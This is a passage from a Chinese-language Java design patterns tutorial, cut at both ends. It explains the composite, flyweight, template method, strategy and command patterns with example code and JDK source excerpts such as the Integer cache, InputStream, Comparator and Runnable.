，又能防止其中方法被不合理的访问。\n组合模式概述\n对于这个图片肯定会非常熟悉，上图我们可以看做是一个文件系统，对于这样的结构我们称之为树形结构。在树形结构中可以通过调用某个方法来遍历整个树，当我们找到某个叶子节点后，就可以对叶子节点进行相关的操作。可以将这颗树理解成一个大的容器，容器里面包含很多的成员对象，这些成员对象即可是容器对象也可以是叶子对象。但是由于容器对象和叶子对象在功能上面的区别，使得我们在使用的过程中必须要区分容器对象和叶子对象，但是这样就会给客户带来不必要的麻烦，作为客户而已，它始终希望能够一致地对待容器对象和叶子对象。\n定义：又名部分整体模式，是用于把一组相似的对象当作一个单一的对象。组合模式依据树形结构来组合对象，用来表示部分以及整体层次。这种类型的设计模式属于结构型模式，它创建了对象组的树形结构。\n结构组合模式主要包含三种角色：\n\n抽象根节点（Component）：定义系统各层次对象的共有方法和属性，可以预先定义一些默认行为和属性。\n树枝节点（Composite）：定义树枝节点的行为，存储子节点，组合树枝节点和叶子节点形成一个树形结构。\n叶子节点（Leaf）：叶子节点对象，其下再无分支，是系统层次遍历的最小单位。\n\n案例实现例：软件菜单如下图，我们在访问别的一些管理系统时，经常可以看到类似的菜单。一个菜单可以包含菜单项（菜单项是指不再包含其他内容的菜单条目），也可以包含带有其他菜单项的菜单。因此使用组合模式描述菜单就很恰当，我们的需求是针对一个菜单，打印出其包含的所有菜单以及菜单项的名称。\n\n要实现该案例，我们先画出类图：\n\n代码实现：不管是菜单还是菜单项，都应该继承自统一的接口，这里姑且将这个统一的接口称为菜单组件。\n//菜单组件  不管是菜单还是菜单项，都应该继承该类public abstract class MenuComponent &#123;    protected String name;    protected int level;    //添加菜单    public void add(MenuComponent menuComponent)&#123;        throw new UnsupportedOperationException();    &#125;    //移除菜单    public void remove(MenuComponent menuComponent)&#123;        throw new UnsupportedOperationException();    &#125;    //获取指定的子菜单    public MenuComponent getChild(int i)&#123;        throw new UnsupportedOperationException();    &#125;    //获取菜单名称    public String getName()&#123;        return name;    &#125;    public void print()&#123;        throw new UnsupportedOperationException();    &#125;&#125;\n\n这里的MenuComponent定义为抽象类，因为有一些共有的属性和行为要在该类中实现。Menu和MenuItem类就可以只覆盖自己感兴趣的方法，而不用搭理不需要或者不感兴趣的方法。举例来说，Menu类可以包含子菜单，因此需要覆盖add()、remove()、getChild()方法，但是MenuItem就不应该有这些方法。这里给出的默认实现是抛出异常，你也可以根据自己的需要改写默认实现。\npublic class Menu extends MenuComponent &#123;    private List&lt;MenuComponent&gt; menuComponentList;    public Menu(String name,int level)&#123;        this.level = level;        this.name = name;        menuComponentList = new ArrayList&lt;MenuComponent&gt;();    &#125;    @Override    public void add(MenuComponent menuComponent) &#123;        menuComponentList.add(menuComponent);    &#125;    @Override    public void remove(MenuComponent menuComponent) &#123;        menuComponentList.remove(menuComponent);    &#125;    @Override    public MenuComponent getChild(int i) &#123;        return menuComponentList.get(i);    &#125;    @Override    public void print() &#123;        for (int i = 1; i &lt; level; i++) &#123;            System.out.print(&quot;--&quot;);        &#125;        System.out.println(name);        for (MenuComponent menuComponent : menuComponentList) &#123;            menuComponent.print();        &#125;    &#125;&#125;\n\nMenu类已经实现了除了getName方法的其他所有方法，因为Menu类具有添加菜单，移除菜单和获取子菜单的功能。\npublic class MenuItem extends MenuComponent &#123;    public MenuItem(String name,int level) &#123;        this.name = name;        this.level = level;    &#125;    @Override    public void print() &#123;        for (int i = 1; i &lt; level; i++) &#123;            System.out.print(&quot;--&quot;);        &#125;        System.out.println(name);    &#125;&#125;\n\nMenuItem是菜单项，不能再有子菜单，所以添加菜单，移除菜单和获取子菜单的功能并不能实现。\npublic class Client &#123;    public static void main(String[] args) &#123;        // 创建菜单树        MenuComponent menu1 = new Menu(&quot;菜单管理&quot;,2);        menu1.add(new MenuItem(&quot;页面访问&quot;,3));        menu1.add(new MenuItem(&quot;展开菜单&quot;,3));        menu1.add(new MenuItem(&quot;编辑菜单&quot;,3));        menu1.add(new MenuItem(&quot;删除菜单&quot;,3));        menu1.add(new MenuItem(&quot;新增菜单&quot;,3));        MenuComponent menu2 = new Menu(&quot;权限管理&quot;,2);        menu2.add(new MenuItem(&quot;页面访问&quot;,3));        menu2.add(new MenuItem(&quot;提交保存&quot;,3));        MenuComponent menu3 = new Menu(&quot;角色管理&quot;,2);        menu3.add(new MenuItem(&quot;页面访问&quot;,3));        menu3.add(new MenuItem(&quot;新增角色&quot;,3));        menu3.add(new MenuItem(&quot;修改角色&quot;,3));        // 创建一级菜单        MenuComponent component = new Menu(&quot;系统管理&quot;,1);        // 将二级菜单添加到一级菜单        component.add(menu1);        component.add(menu2);        component.add(menu3);        // 打印菜单名称（递归打印）        component.print();    &#125;&#125;\n\n组合模式的分类在使用组合模式时，根据抽象构件类的定义形式，我们可将组合模式分为透明组合模式和安全组合模式两种形式。\n\n透明组合模式\n透明组合模式中，抽象根节点角色中声明了所有用于管理成员对象的方法，比如在示例中 MenuComponent 声明了 add、remove 、getChild 方法，这样做的好处是确保所有的构件类都有相同的接口。透明组合模式也是组合模式的标准形式。\n透明组合模式的缺点是不够安全，因为叶子对象和容器对象在本质上是有区别的，叶子对象不可能有下一个层次的对象，即不可能包含成员对象，因此为其提供 add()、remove() 等方法是没有意义的，这在编译阶段不会出错，但在运行阶段如果调用这些方法可能会出错（如果没有提供相应的错误处理代码）\n\n\n安全组合模式\n在安全组合模式中，在抽象构件角色中没有声明任何用于管理成员对象的方法，而是在树枝节点 Menu 类中声明并实现这些方法。安全组合模式的缺点是不够透明，因为叶子构件和容器构件具有不同的方法，且容器构件中那些用于管理成员对象的方法没有在抽象构件类中定义，因此客户端不能完全针对抽象编程，必须有区别地对待叶子构件和容器构件。\n\n\n\n\n优点\n组合模式可以清楚地定义分层次的复杂对象，表示对象的全部或部分层次，它让客户端忽略了层次的差异，方便对整个层次结构进行控制。\n客户端可以一致地使用一个组合结构或其中单个对象，不必关心处理的是单个对象还是整个组合结构，简化了客户端代码。\n在组合模式中增加新的树枝节点和叶子节点都很方便，无须对现有类库进行任何修改，符合“开闭原则”。\n组合模式为树形结构的面向对象实现提供了一种灵活的解决方案，通过叶子节点和树枝节点的递归组合，可以形成复杂的树形结构，但对树形结构的控制却非常简单。\n\n使用场景组合模式正是应树形结构而生，所以组合模式的使用场景就是出现树形结构的地方。比如：文件目录显示，多级目录呈现等树形结构数据的操作。\n享元模式概述定义：运用共享技术来有效地支持大量细粒度对象的复用。它通过共享已经存在的对象来大幅度减少需要创建的对象数量、避免大量相似对象的开销，从而提高系统资源的利用率。\n结构享元（Flyweight ）模式中存在以下两种状态：\n\n内部状态，即不会随着环境的改变而改变的可共享部分。\n外部状态，指随环境改变而改变的不可以共享的部分。享元模式的实现要领就是区分应用中的这两种状态，并将外部状态外部化。\n\n享元模式的主要有以下角色：\n\n抽象享元角色（Flyweight）：通常是一个接口或抽象类，在抽象享元类中声明了具体享元类公共的方法，这些方法可以向外界提供享元对象的内部数据（内部状态），同时也可以通过这些方法来设置外部数据（外部状态）。\n具体享元（Concrete Flyweight）角色 ：它实现了抽象享元类，称为享元对象；在具体享元类中为内部状态提供了存储空间。通常我们可以结合单例模式来设计具体享元类，为每一个具体享元类提供唯一的享元对象。\n非享元（Unsharable Flyweight)角色 ：并不是所有的抽象享元类的子类都需要被共享，不能被共享的子类可设计为非共享具体享元类；当需要一个非共享具体享元类的对象时可以直接通过实例化创建。\n享元工厂（Flyweight Factory）角色 ：负责创建和管理享元角色。当客户对象请求一个享元对象时，享元工厂检査系统中是否存在符合要求的享元对象，如果存在则提供给客户；如果不存在的话，则创建一个新的享元对象。\n\n案例实现例：俄罗斯方块下面的图片是众所周知的俄罗斯方块中的一个个方块，如果在俄罗斯方块这个游戏中，每个不同的方块都是一个实例对象，这些对象就要占用很多的内存空间，下面利用享元模式进行实现。\n\n先来看类图：\n\n代码如下：俄罗斯方块有不同的形状，我们可以对这些形状向上抽取出AbstractBox，用来定义共性的属性和行为。\npublic abstract class AbstractBox &#123;    public abstract String getShape();    public void display(String color) &#123;        System.out.println(&quot;方块形状：&quot; + this.getShape() + &quot; 颜色：&quot; + color);    &#125;&#125;\n\n接下来就是定义不同的形状了，IBox类、LBox类、OBox类等。\npublic class IBox extends AbstractBox &#123;    @Override    public String getShape() &#123;        return &quot;I&quot;;    &#125;&#125;public class LBox extends AbstractBox &#123;    @Override    public String getShape() &#123;        return &quot;L&quot;;    &#125;&#125;public class OBox extends AbstractBox &#123;    @Override    public String getShape() &#123;        return &quot;O&quot;;    &#125;&#125;\n\n提供了一个工厂类（BoxFactory），用来管理享元对象（也就是AbstractBox子类对象），该工厂类对象只需要一个，所以可以使用单例模式。并给工厂类提供一个获取形状的方法。\npublic class BoxFactory &#123;    private static HashMap&lt;String, AbstractBox&gt; map;    private BoxFactory() &#123;        map = new HashMap&lt;String, AbstractBox&gt;();        AbstractBox iBox = new IBox();        AbstractBox lBox = new LBox();        AbstractBox oBox = new OBox();        map.put(&quot;I&quot;, iBox);        map.put(&quot;L&quot;, lBox);        map.put(&quot;O&quot;, oBox);    &#125;    public static final BoxFactory getInstance() &#123;        return SingletonHolder.INSTANCE;    &#125;    private static class SingletonHolder &#123;        private static final BoxFactory INSTANCE = new BoxFactory();    &#125;    public AbstractBox getBox(String key) &#123;        return map.get(key);    &#125;&#125;\n\n测试类\npublic class Client &#123;    public static void main(String[] args) &#123;        // 获取I图形        AbstractBox box1 = BoxFactory.getInstance().getBox(&quot;I&quot;);        box1.display(&quot;灰色&quot;);        // 获取:图形        AbstractBox box2 = BoxFactory.getInstance().getBox(&quot;L&quot;);        box2.display(&quot;红色&quot;);        // 获取O图形        AbstractBox box3 = BoxFactory.getInstance().getBox(&quot;O&quot;);        box3.display(&quot;灰色&quot;);        // 获取O图形        AbstractBox box4 = BoxFactory.getInstance().getBox(&quot;O&quot;);        box4.display(&quot;白色&quot;);        System.out.println(&quot;两次获取到的O对象是否为同一对象:&quot; + (box3 == box4));    &#125;&#125;\n\n优缺点和使用场景\n优点\n极大减少内存中相似或相同对象数量，节约系统资源，提供系统性能\n享元模式中的外部状态相对独立，且不影响内部状态\n\n\n缺点：为了使对象可以共享，需要将享元对象的部分状态外部化，分离内部状态和外部状态，使程序逻辑复杂\n使用场景：\n一个系统有大量相同或者相似的对象，造成内存的大量耗费。\n对象的大部分状态都可以外部化，可以将这些外部状态传入对象中。\n在使用享元模式时需要维护一个存储享元对象的享元池，而这需要耗费一定的系统资源，因此，应当在需要多次重复使用享元对象时才值得使用享元模式。\n\n\n\nJDK中的应用（Integer类）Integer类使用了享元模式。先看下面的例子：\npublic class Client &#123;    public static void main(String[] args) &#123;        Integer i1 = 127;        Integer i2 = 127;        System.out.println(&quot;i1和i2对象是否是同一个对象？&quot; + (i1 == i2));        Integer i3 = 128;        Integer i4 = 128;        System.out.println(&quot;i3和i4对象是否是同一个对象？&quot; + (i3 == i4));    &#125;&#125;\n\n运行上面代码，结果如下：\n\n为什么第一个输出语句输出的是true，第二个输出语句输出的是false？通过反编译软件进行反编译，代码如下：\npublic class Client &#123;    public static void main(String[] args) &#123;        Integer i1 = Integer.valueOf((int)127);        Integer i2 = Integer.valueOf((int)127);        System.out.println((String)new StringBuilder().append((String)&quot;i1\\u548ci2\\u5bf9\\u8c61\\u662f\\u5426\\u662f\\u540c\\u4e00\\u4e2a\\u5bf9\\u8c61\\uff1f&quot;).append((boolean)(i1 == i2)).toString());        Integer i3 = Integer.valueOf((int)128);        Integer i4 = Integer.valueOf((int)128);        System.out.println((String)new StringBuilder().append((String)&quot;i3\\u548ci4\\u5bf9\\u8c61\\u662f\\u5426\\u662f\\u540c\\u4e00\\u4e2a\\u5bf9\\u8c61\\uff1f&quot;).append((boolean)(i3 == i4)).toString());    &#125;&#125;\n\n上面代码可以看到，直接给Integer类型的变量赋值基本数据类型数据的操作底层使用的是 valueOf() ，所以只需要看该方法即可\npublic final class Integer extends Number implements Comparable&lt;Integer&gt; &#123;    \tpublic static Integer valueOf(int i) &#123;        if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)            return IntegerCache.cache[i + (-IntegerCache.low)];        return new Integer(i);    &#125;        private static class IntegerCache &#123;        static final int low = -128;        static final int high;        static final Integer cache[];        static &#123;            int h = 127;            String integerCacheHighPropValue =                sun.misc.VM.getSavedProperty(&quot;java.lang.Integer.IntegerCache.high&quot;);            if (integerCacheHighPropValue != null) &#123;                try &#123;                    int i = parseInt(integerCacheHighPropValue);                    i = Math.max(i, 127);                    // Maximum array size is Integer.MAX_VALUE                    h = Math.min(i, Integer.MAX_VALUE - (-low) -1);                &#125; catch( NumberFormatException nfe) &#123;                &#125;            &#125;            high = h;            cache = new Integer[(high - low) + 1];            int j = low;            for(int k = 0; k &lt; cache.length; k++)                cache[k] = new Integer(j++);            // range [-128, 127] must be interned (JLS7 5.1.7)            assert IntegerCache.high &gt;= 127;        &#125;        private IntegerCache() &#123;&#125;    &#125;&#125;\n\n可以看到 Integer 默认先创建并缓存 -128 ~ 127 之间数的 Integer 对象，当调用 valueOf 时如果参数在 -128 ~ 127 之间则计算下标并从缓存中返回，否则创建一个新的 Integer 对象。\n行为型模式行为型模式用于描述程序在运行时复杂的流程控制，即描述多个类或对象之间怎样相互协作共同完成单个对象都无法单独完成的任务，它涉及算法与对象间职责的分配。\n行为型模式分为类行为模式和对象行为模式，前者采用继承机制来在类间分派行为，后者采用组合或聚合在对象间分配行为。由于组合关系或聚合关系比继承关系耦合度低，满足“合成复用原则”，所以对象行为模式比类行为模式具有更大的灵活性。\n行为型模式分为：\n\n模板方法模式\n策略模式\n命令模式\n职责链模式\n状态模式\n观察者模式\n中介者模式\n迭代器模式\n访问者模式\n备忘录模式\n解释器模式\n\n以上 11 种行为型模式，除了模板方法模式和解释器模式是类行为型模式，其他的全部属于对象行为型模式。\n模板方法模式概述在面向对象程序设计过程中，程序员常常会遇到这种情况：设计一个系统时知道了算法所需的关键步骤，而且确定了这些步骤的执行顺序，但某些步骤的具体实现还未知，或者说某些步骤的实现与具体的环境相关。\n例如，去银行办理业务一般要经过以下4个流程：取号、排队、办理具体业务、对银行工作人员进行评分等，其中取号、排队和对银行工作人员进行评分的业务对每个客户是一样的，可以在父类中实现，但是办理具体业务却因人而异，它可能是存款、取款或者转账等，可以延迟到子类中实现。\n定义：定义一个操作中的算法骨架，而将算法的一些步骤延迟到子类中，使得子类可以不改变该算法结构的情况下重定义该算法的某些特定步骤。\n结构模板方法（Template Method）模式包含以下主要角色：\n\n抽象类（Abstract Class）：负责给出一个算法的轮廓和骨架。它由一个模板方法和若干个基本方法构成。\n模板方法：定义了算法的骨架，按某种顺序调用其包含的基本方法。\n基本方法：是实现算法各个步骤的方法，是模板方法的组成部分。基本方法又可以分为三种：\n抽象方法(Abstract Method) ：一个抽象方法由抽象类声明、由其具体子类实现。\n具体方法(Concrete Method) ：一个具体方法由一个抽象类或具体类声明并实现，其子类可以进行覆盖也可以直接继承。\n钩子方法(Hook Method) ：在抽象类中已经实现，包括用于判断的逻辑方法和需要子类重写的空方法两种。一般钩子方法是用于判断的逻辑方法，这类方法名一般为isXxx，返回值类型为boolean类型。\n\n\n\n\n具体子类（Concrete Class）：实现抽象类中所定义的抽象方法和钩子方法，它们是一个顶级逻辑的组成步骤。\n\n案例实现例：炒菜炒菜的步骤是固定的，分为倒油、热油、倒蔬菜、倒调料品、翻炒等步骤。现通过模板方法模式来用代码模拟。类图如下：\n\n代码如下：\npublic abstract class AbstractClass &#123;        public final void cookProcess() &#123;        //第一步：倒油        this.pourOil();        //第二步：热油        this.heatOil();        //第三步：倒蔬菜        this.pourVegetable();        //第四步：倒调味料        this.pourSauce();        //第五步：翻炒        this.fry();    &#125;    public void pourOil() &#123;        System.out.println(&quot;倒油&quot;);    &#125;    //第二步：热油是一样的，所以直接实现    public void heatOil() &#123;        System.out.println(&quot;热油&quot;);    &#125;    //第三步：倒蔬菜是不一样的（一个下包菜，一个是下菜心）    public abstract void pourVegetable();    //第四步：倒调味料是不一样    public abstract void pourSauce();    //第五步：翻炒是一样的，所以直接实现    public void fry()&#123;        System.out.println(&quot;炒啊炒啊炒到熟啊&quot;);    &#125;&#125;public class ConcreteClass_BaoCai extends AbstractClass &#123;    @Override    public void pourVegetable() &#123;        System.out.println(&quot;下锅的蔬菜是包菜&quot;);    &#125;    @Override    public void pourSauce() &#123;        System.out.println(&quot;下锅的酱料是辣椒&quot;);    &#125;&#125;public class ConcreteClass_CaiXin extends AbstractClass &#123;    @Override    public void pourVegetable() &#123;        System.out.println(&quot;下锅的蔬菜是菜心&quot;);    &#125;    @Override    public void pourSauce() &#123;        System.out.println(&quot;下锅的酱料是蒜蓉&quot;);    &#125;&#125;public class Client &#123;    public static void main(String[] args) &#123;        //炒手撕包菜        ConcreteClass_BaoCai baoCai = new ConcreteClass_BaoCai();        baoCai.cookProcess();        //炒蒜蓉菜心        ConcreteClass_CaiXin caiXin = new ConcreteClass_CaiXin();        caiXin.cookProcess();    &#125;&#125;\n\n\n注意：为防止恶意操作，一般模板方法都加上 final 关键词。\n\n优缺点优点：\n\n提高代码复用性将相同部分的代码放在抽象的父类中，而将不同的代码放入不同的子类中。\n实现了反向控制通过一个父类调用其子类的操作，通过对子类的具体实现扩展不同的行为，实现了反向控制 ，并符合“开闭原则”。\n\n缺点：\n\n对每个不同的实现都需要定义一个子类，这会导致类的个数增加，系统更加庞大，设计也更加抽象。\n父类中的抽象方法由子类实现，子类执行的结果会影响父类的结果，这导致一种反向的控制结构，它提高了代码阅读的难度。\n\n适用场景\n算法的整体步骤很固定，但其中个别部分易变时，这时候可以使用模板方法模式，将容易变的部分抽象出来，供子类实现。\n需要通过子类来决定父类算法中某个步骤是否执行，实现子类对父类的反向控制。\n\nJDK中的应用（InputStream类）InputStream类就使用了模板方法模式。在InputStream类中定义了多个 read() 方法，如下：\npublic abstract class InputStream implements Closeable &#123;    //抽象方法，要求子类必须重写    public abstract int read() throws IOException;    public int read(byte b[]) throws IOException &#123;        return read(b, 0, b.length);    &#125;    public int read(byte b[], int off, int len) throws IOException &#123;        if (b == null) &#123;            throw new NullPointerException();        &#125; else if (off &lt; 0 || len &lt; 0 || len &gt; b.length - off) &#123;            throw new IndexOutOfBoundsException();        &#125; else if (len == 0) &#123;            return 0;        &#125;        int c = read(); //调用了无参的read方法，该方法是每次读取一个字节数据        if (c == -1) &#123;            return -1;        &#125;        b[off] = (byte)c;        int i = 1;        try &#123;            for (; i &lt; len ; i++) &#123;                c = read();                if (c == -1) &#123;                    break;                &#125;                b[off + i] = (byte)c;            &#125;        &#125; catch (IOException ee) &#123;        &#125;        return i;    &#125;&#125;\n\n从上面代码可以看到，无参的 read() 方法是抽象方法，要求子类必须实现。而 read(byte b[]) 方法调用了 read(byte b[], int off, int len) 方法，所以在此处重点看的方法是带三个参数的方法。在该方法中第18行、27行，可以看到调用了无参的抽象的 read() 方法。总结如下： 在InputStream父类中已经定义好了读取一个字节数组数据的方法是每次读取一个字节，并将其存储到数组的第一个索引位置，读取len个字节数据。具体如何读取一个字节数据呢？由子类实现。\n策略模式概述先看下面的图片，我们去旅游选择出行模式有很多种，可以骑自行车、可以坐汽车、可以坐火车、可以坐飞机。\n\n作为一个程序猿，开发需要选择一款开发工具，当然可以进行代码开发的工具有很多，可以选择Idea进行开发，也可以使用eclipse进行开发，也可以使用其他的一些开发工具。\n\n定义：该模式定义了一系列算法，并将每个算法封装起来，使它们可以相互替换，且算法的变化不会影响使用算法的客户。策略模式属于对象行为模式，它通过对算法进行封装，把使用算法的责任和算法的实现分割开来，并委派给不同的对象对这些算法进行管理。\n结构策略模式的主要角色如下：\n\n抽象策略（Strategy）类：这是一个抽象角色，通常由一个接口或抽象类实现。此角色给出所有的具体策略类所需的接口。\n具体策略（Concrete Strategy）类：实现了抽象策略定义的接口，提供具体的算法实现或行为。\n环境（Context）类：持有一个策略类的引用，最终给客户端调用。\n\n案例实现例：促销活动一家百货公司在定年度的促销活动。针对不同的节日（春节、中秋节、圣诞节）推出不同的促销活动，由促销员将促销活动展示给客户。类图如下：\n\n代码如下：定义百货公司所有促销活动的共同接口\npublic interface Strategy &#123;    void show();&#125;\n\n定义具体策略角色（Concrete Strategy）：每个节日具体的促销活动\n//为春节准备的促销活动Apublic class StrategyA implements Strategy &#123;    public void show() &#123;        System.out.println(&quot;买一送一&quot;);    &#125;&#125;//为中秋准备的促销活动Bpublic class StrategyB implements Strategy &#123;    public void show() &#123;        System.out.println(&quot;满200元减50元&quot;);    &#125;&#125;//为圣诞准备的促销活动Cpublic class StrategyC implements Strategy &#123;    public void show() &#123;        System.out.println(&quot;满1000元加一元换购任意200元以下商品&quot;);    &#125;&#125;\n\n定义环境角色（Context）：用于连接上下文，即把促销活动推销给客户，这里可以理解为销售员\npublic class SalesMan &#123;                            //持有抽象策略角色的引用                                  private Strategy strategy;                                                                    public SalesMan(Strategy strategy) &#123;               this.strategy = strategy;                  &#125;                                                                                             //向客户展示促销活动                                    public void salesManShow()&#123;                        strategy.show();                           &#125;                                          &#125;                                              \n\n测试类：\npublic class Client &#123;    public static void main(String[] args) &#123;        SalesMan salesMan = new SalesMan(new StrategyA());        salesMan.salesManShow();        salesMan.setStrategy(new StrategyB());        salesMan.salesManShow();    &#125;&#125;\n\n优缺点\n优点：\n策略类之间可以自由切换由于策略类都实现同一个接口，所以使它们之间可以自由切换。\n易于扩展增加一个新的策略只需要添加一个具体的策略类即可，基本不需要改变原有的代码，符合“开闭原则“\n避免使用多重条件选择语句（if else），充分体现面向对象设计思想。\n\n\n缺点：\n客户端必须知道所有的策略类，并自行决定使用哪一个策略类。\n策略模式将造成产生很多策略类，可以通过使用享元模式在一定程度上减少对象的数量。\n\n\n\n使用场景\n一个系统需要动态地在几种算法中选择一种时，可将每个算法封装到策略类中。\n一个类定义了多种行为，并且这些行为在这个类的操作中以多个条件语句的形式出现，可将每个条件分支移入它们各自的策略类中以代替这些条件语句。\n系统中各算法彼此完全独立，且要求对客户隐藏具体算法的实现细节时。\n系统要求使用算法的客户不应该知道其操作的数据时，可使用策略模式来隐藏与算法相关的数据结构。\n多个类只区别在表现行为不同，可以使用策略模式，在运行时动态选择具体要执行的行为。\n\nJDK中的应用（Comparator比较器）Comparator 中的策略模式。在Arrays类中有一个 sort() 方法，如下：\npublic class Arrays&#123;    public static &lt;T&gt; void sort(T[] a, Comparator&lt;? super T&gt; c) &#123;        if (c == null) &#123;            sort(a);        &#125; else &#123;            if (LegacyMergeSort.userRequested)                legacyMergeSort(a, c);            else                TimSort.sort(a, 0, a.length, c, null, 0, 0);        &#125;    &#125;&#125;\n\nArrays就是一个环境角色类，这个sort方法可以传一个新策略让Arrays根据这个策略来进行排序。就比如下面的测试类。\npublic class Client &#123;    public static void main(String[] args) &#123;        Integer[] data = &#123;12, 2, 3, 2, 4, 5, 1&#125;;        // 实现降序排序        Arrays.sort(data, new Comparator&lt;Integer&gt;() &#123;            public int compare(Integer o1, Integer o2) &#123;                return o2 - o1;            &#125;        &#125;);        System.out.println(Arrays.toString(data)); //[12, 5, 4, 3, 2, 2, 1]    &#125;&#125;\n\n这里在调用Arrays的sort方法时，第二个参数传递的是Comparator接口的子实现类对象。所以Comparator充当的是抽象策略角色，而具体的子实现类充当的是具体策略角色。环境角色类（Arrays）应该持有抽象策略的引用来调用。那么，Arrays类的sort方法到底有没有使用Comparator子实现类中的 compare() 方法？查看TimSort类的 sort() 方法，代码如下：\nclass TimSort&lt;T&gt; &#123;    static &lt;T&gt; void sort(T[] a, int lo, int hi, Comparator&lt;? super T&gt; c,                         T[] work, int workBase, int workLen) &#123;        assert c != null &amp;&amp; a != null &amp;&amp; lo &gt;= 0 &amp;&amp; lo &lt;= hi &amp;&amp; hi &lt;= a.length;        int nRemaining  = hi - lo;        if (nRemaining &lt; 2)            return;  // Arrays of size 0 and 1 are always sorted        // If array is small, do a &quot;mini-TimSort&quot; with no merges        if (nRemaining &lt; MIN_MERGE) &#123;            int initRunLen = countRunAndMakeAscending(a, lo, hi, c);            binarySort(a, lo, hi, lo + initRunLen, c);            return;        &#125;        ...    &#125;               private static &lt;T&gt; int countRunAndMakeAscending(T[] a, int lo, int hi,Comparator&lt;? super T&gt; c) &#123;        assert lo &lt; hi;        int runHi = lo + 1;        if (runHi == hi)            return 1;        // Find end of run, and reverse range if descending        if (c.compare(a[runHi++], a[lo]) &lt; 0) &#123; // Descending            while (runHi &lt; hi &amp;&amp; c.compare(a[runHi], a[runHi - 1]) &lt; 0)                runHi++;            reverseRange(a, lo, runHi);        &#125; else &#123;                              // Ascending            while (runHi &lt; hi &amp;&amp; c.compare(a[runHi], a[runHi - 1]) &gt;= 0)                runHi++;        &#125;        return runHi - lo;    &#125;&#125;\n\n上面的代码中最终会跑到 countRunAndMakeAscending() 这个方法中。可以看见，只用了compare方法，所以在调用Arrays.sort方法只传具体compare重写方法的类对象就行，这也是Comparator接口中必须要子类实现的一个方法。\n命令模式概述日常生活中，出去吃饭都会遇到下面的场景。\n\n定义：将一个请求封装为一个对象，使发出请求的责任和执行请求的责任分割开。这样两者之间通过命令对象进行沟通，这样方便将命令对象进行存储、传递、调用、增加与管理。\n结构命令模式包含以下主要角色：\n\n抽象命令类（Command）角色： 定义命令的接口，声明执行的方法。\n具体命令（Concrete  Command）角色：具体的命令，实现命令接口；通常会持有接收者，并调用接收者的功能来完成命令要执行的操作。\n实现者&#x2F;接收者（Receiver）角色： 接收者，真正执行命令的对象。任何类都可能成为一个接收者，只要它能够实现命令要求实现的相应功能。\n调用者&#x2F;请求者（Invoker）角色： 要求命令对象执行请求，通常会持有命令对象，可以持有很多的命令对象。这个是客户端真正触发命令并要求命令执行相应操作的地方，也就是说相当于使用命令对象的入口。\n\n案例实现将上面的案例用代码实现，那就需要分析命令模式的角色在该案例中由谁来充当。\n服务员： 就是调用者角色，由她来发起命令。资深大厨： 就是接收者角色，真正命令执行的对象。订单： 命令中包含订单。\n类图如下：\n\n代码如下：\npublic interface Command &#123;    void execute();//只需要定义一个统一的执行方法&#125;public class OrderCommand implements Command &#123;    //持有接受者对象    private SeniorChef receiver;    private Order order;    public OrderCommand(SeniorChef receiver, Order order)&#123;        this.receiver = receiver;        this.order = order;    &#125;    public void execute()  &#123;        System.out.println(order.getDiningTable() + &quot;桌的订单：&quot;);        Set&lt;String&gt; keys = order.getFoodDic().keySet();        for (String key : keys) &#123;            receiver.makeFood(order.getFoodDic().get(key),key);        &#125;        try &#123;            Thread.sleep(100);//停顿一下 模拟做饭的过程        &#125; catch (InterruptedException e) &#123;            e.printStackTrace();        &#125;                System.out.println(order.getDiningTable() + &quot;桌的饭弄好了&quot;);    &#125;&#125;public class Order &#123;    // 餐桌号码    private int diningTable;    // 用来存储餐名并记录份数    private Map&lt;String, Integer&gt; foodDic = new HashMap&lt;String, Integer&gt;();    public int getDiningTable() &#123;        return diningTable;    &#125;    public void setDiningTable(int diningTable) &#123;        this.diningTable = diningTable;    &#125;    public Map&lt;String, Integer&gt; getFoodDic() &#123;        return foodDic;    &#125;    public void setFoodDic(String name, int num) &#123;        foodDic.put(name,num);    &#125;&#125;// 资深大厨类 是命令的Receiverpublic class SeniorChef &#123;    public void makeFood(int num,String foodName) &#123;        System.out.println(num + &quot;份&quot; + foodName);    &#125;&#125;public class Waitor &#123;    private ArrayList&lt;Command&gt; commands;//可以持有很多的命令对象    public Waitor() &#123;        commands = new ArrayList();    &#125;        public void setCommand(Command cmd)&#123;        commands.add(cmd);    &#125;    // 发出命令 喊 订单来了，厨师开始执行    public void orderUp() &#123;        System.out.println(&quot;美女服务员：叮咚，大厨，新订单来了.......&quot;);        for (int i = 0; i &lt; commands.size(); i++) &#123;            Command cmd = commands.get(i);            if (cmd != null) &#123;                cmd.execute();            &#125;        &#125;    &#125;&#125;public class Client &#123;    public static void main(String[] args) &#123;        //创建2个order        Order order1 = new Order();        order1.setDiningTable(1);        order1.getFoodDic().put(&quot;西红柿鸡蛋面&quot;,1);        order1.getFoodDic().put(&quot;小杯可乐&quot;,2);        Order order2 = new Order();        order2.setDiningTable(3);        order2.getFoodDic().put(&quot;尖椒肉丝盖饭&quot;,1);        order2.getFoodDic().put(&quot;小杯雪碧&quot;,1);        //创建接收者        SeniorChef receiver=new SeniorChef();        //将订单和接收者封装成命令对象        OrderCommand cmd1 = new OrderCommand(receiver, order1);        OrderCommand cmd2 = new OrderCommand(receiver, order2);        //创建调用者 waitor        Waitor invoker = new Waitor();        invoker.setCommand(cmd1);        invoker.setCommand(cmd2);        //将订单带到柜台 并向厨师喊 订单来了        invoker.orderUp();    &#125;&#125;\n\n优缺点\n优点：\n\n降低系统的耦合度。命令模式能将调用操作的对象与实现该操作的对象解耦。\n增加或删除命令非常方便。采用命令模式增加与删除命令不会影响其他类，它满足“开闭原则”，对扩展比较灵活。\n可以实现宏命令。命令模式可以与组合模式结合，将多个命令装配成一个组合命令，即宏命令。\n方便实现 Undo 和 Redo 操作。命令模式可以与后面介绍的备忘录模式结合，实现命令的撤销与恢复。\n\n\n缺点：\n\n使用命令模式可能会导致某些系统有过多的具体命令类。\n系统结构更加复杂。\n\n\n\n使用场景\n系统需要将请求调用者和请求接收者解耦，使得调用者和接收者不直接交互。\n系统需要在不同的时间指定请求、将请求排队和执行请求。\n系统需要支持命令的撤销(Undo)操作和恢复(Redo)操作。\n\nJDK中的应用（Runable类）Runable是一个典型命令模式，Runnable担当命令的角色，Thread充当的是调用者，start方法就是其执行方法\n//命令接口(抽象命令角色)public interface Runnable &#123;\tpublic abstract void run();&#125;//调用者public class Thread implements Runnable &#123;    private Runnable target;        public synchronized void start() &#123;        if (threadStatus != 0)            throw new IllegalThreadStateException();        group.add(this);        boolean started = false;        try &#123;            start0();            started = true;        &#125; finally &#123;  